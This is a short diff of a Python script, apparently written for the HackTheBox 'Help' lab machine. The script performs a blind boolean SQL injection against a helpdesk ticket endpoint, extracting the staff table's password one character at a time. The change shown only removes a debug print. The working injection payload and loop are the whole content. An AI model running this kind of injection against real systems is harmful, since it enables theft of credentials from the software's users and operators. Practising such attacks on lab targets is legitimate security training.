@@ -18,7 +18,6 @@ for i in range(1,41):
         response = requests.get(f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=2&param[]=8+AND+SUBSTRING((SELECT+Password+FROM+staff),+{i},+1)+=+'{str(j)}'+--+-", verify=False, headers=headers)
         if "find" not in response.text:
             password += str(j)
-            print(password)
             break
 
 print(password)
